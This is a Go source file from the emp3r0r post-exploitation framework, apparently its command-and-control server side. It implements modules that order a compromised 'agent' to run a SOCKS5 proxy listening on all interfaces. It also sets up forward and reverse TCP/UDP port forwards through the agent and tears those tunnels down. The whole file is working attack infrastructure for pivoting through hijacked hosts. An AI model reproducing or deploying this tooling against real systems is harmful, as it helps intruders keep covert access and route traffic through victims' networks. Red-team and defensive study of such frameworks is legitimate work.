//go:build linux
// +build linux

package cc

import (
	"context"
	"fmt"

	"github.com/google/uuid"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func modulePortFwd() {
	switchOpt, ok := CurrentModuleOptions["switch"]
	if !ok {
		LogError("Option 'switch' not found")
		return
	}
	switch switchOpt.Val {
	case "off":
		// ugly, i know, it will delete port mappings matching current lport-to combination
		for id, session := range PortFwds {
			toOpt, ok := CurrentModuleOptions["to"]
			if !ok {
				LogError("Option 'to' not found")
				return
			}
			listenPortOpt, ok := CurrentModuleOptions["listen_port"]
			if !ok {
				LogError("Option 'listen_port' not found")
				return
			}
			if session.To == toOpt.Val && session.Lport == listenPortOpt.Val {
				session.Cancel()     // cancel the PortFwd session
				delete(PortFwds, id) // remove from port mapping list

				// tell the agent to close connection
				// make sure handler returns
				// cmd format: !port_fwd [to/listen] [shID] [operation]
				cmd := fmt.Sprintf("%s --shID %s --operation stop", emp3r0r_def.C2CmdPortFwd, id)
				sendCMDerr := SendCmd(cmd, "", CurrentTarget)
				if sendCMDerr != nil {
					LogError("SendCmd: %v", sendCMDerr)
					return
				}
				return
			}
			LogError("Could not find port mapping (to %s, listening on %s)",
				toOpt.Val, listenPortOpt.Val)
		}
	case "reverse": // expose a dest from CC to agent
		var pf PortFwdSession
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = CurrentModuleOptions["listen_port"].Val, CurrentModuleOptions["to"].Val
		go func() {
			LogMsg("RunReversedPortFwd: %s -> %s (%s), make a connection and it will appear in `ls_port_fwds`", pf.Lport, pf.To, pf.Protocol)
			initErr := pf.InitReversedPortFwd()
			if initErr != nil {
				LogError("PortFwd (reverse) failed: %v", initErr)
			}
		}()
	case "on":
		var pf PortFwdSession
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = CurrentModuleOptions["listen_port"].Val, CurrentModuleOptions["to"].Val
		pf.Protocol = CurrentModuleOptions["protocol"].Val
		go func() {
			LogMsg("RunPortFwd: %s -> %s (%s), make a connection and it will appear in `ls_port_fwds`", pf.Lport, pf.To, pf.Protocol)
			runErr := pf.RunPortFwd()
			if runErr != nil {
				LogError("PortFwd failed: %v", runErr)
			}
		}()
	default:
	}
}

func moduleProxy() {
	portOpt, ok := CurrentModuleOptions["port"]
	if !ok {
		LogError("Option 'port' not found")
		return
	}
	port := portOpt.Val

	statusOpt, ok := CurrentModuleOptions["status"]
	if !ok {
		LogError("Option 'status' not found")
		return
	}
	status := statusOpt.Val

	// port-fwd
	pf := new(PortFwdSession)
	pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
	pf.Lport, pf.To = port, "127.0.0.1:"+RuntimeConfig.Emp3r0rProxyServerPort
	pf.Description = fmt.Sprintf("Agent Proxy (TCP):\n%s (Local) -> %s (Agent)", pf.Lport, pf.To)
	pf.Protocol = "tcp"
	pf.Timeout = RuntimeConfig.AutoProxyTimeout

	// udp port fwd
	pfu := new(PortFwdSession)
	pfu.Ctx, pfu.Cancel = context.WithCancel(context.Background())
	pfu.Lport, pfu.To = port, "127.0.0.1:"+RuntimeConfig.Emp3r0rProxyServerPort
	pfu.Description = fmt.Sprintf("Agent Proxy (UDP):\n%s (Local) -> %s (Agent)", pfu.Lport, pfu.To)
	pfu.Protocol = "udp"
	pfu.Timeout = RuntimeConfig.AutoProxyTimeout

	switch status {
	case "on":
		// tell agent to start local socks5 proxy
		cmd_id := uuid.NewString()
		err := SendCmdToCurrentTarget("!proxy --mode on --addr 0.0.0.0:"+RuntimeConfig.Emp3r0rProxyServerPort, cmd_id)
		if err != nil {
			LogError("Starting SOCKS5 proxy on target failed: %v", err)
			return
		}
		var ok bool
		for i := 0; i < 120; i++ {
			_, ok = CmdResults[cmd_id]
			if ok {
				CmdResultsMutex.Lock()
				delete(CmdResults, cmd_id)
				CmdResultsMutex.Unlock()
				break
			}
			util.TakeABlink()
		}

		if !ok {
			LogError("Timeout waiting for agent to start SOCKS5 proxy")
			return
		} else {
			LogMsg("Agent started SOCKS5 proxy")
			// TCP forwarding
			go func() {
				err := pf.RunPortFwd()
				if err != nil {
					LogError("PortFwd (TCP) failed: %v", err)
				}
			}()
			// UDP forwarding
			go func() {
				for pf.Sh == nil {
					util.TakeABlink()
				}
				err := pfu.RunPortFwd()
				if err != nil {
					LogError("PortFwd (UDP) failed: %v", err)
				}
			}()
		}
	case "off":
		for id, session := range PortFwds {
			if session.Description == pf.Description ||
				session.Description == pfu.Description {
				session.Cancel() // cancel the PortFwd session

				// tell the agent to close connection
				// make sure handler returns
				cmd := fmt.Sprintf("%s --id %s", emp3r0r_def.C2CmdDeletePortFwd, id)
				err := SendCmd(cmd, "", session.Agent)
				if err != nil {
					LogError("SendCmd: %v", err)
					return
				}
			}
		}
	default:
		LogError("Unknown operation '%s'", status)
	}
}
